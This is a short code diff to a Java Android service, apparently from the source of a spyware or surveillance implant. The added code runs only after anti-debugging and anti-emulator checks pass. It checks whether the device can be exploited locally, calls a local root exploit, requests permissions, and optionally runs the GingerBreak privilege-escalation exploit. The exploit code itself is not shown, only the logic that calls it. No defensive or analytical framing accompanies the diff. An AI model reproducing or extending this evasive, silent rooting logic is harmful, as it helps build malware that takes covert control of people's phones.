@@ -81,18 +81,25 @@ public class ServiceMain extends Service {
 
 		// ANTIDEBUG ANTIEMU
 		if (Core.checkStatic()) {
-
-			Root root = new Root();
-			root.getPermissions();
+			if (Root.isRootShellInstalled() == false && Root.checkExploitability()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (onStart): Device seems locally exploitable"); //$NON-NLS-1$
+				}
+				
+				Root.localExploit();
+			}
+			
+			Root.getPermissions();
 
 			if (Cfg.EXP) {
-				root.runGingerBreak();
+				Root.runGingerBreak();
 			}
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (onStart) anti emu/debug failed");
 			}
 		}
+		
 		// Core starts
 		core = Core.newCore(this);
 		core.Start(this.getResources(), getContentResolver());
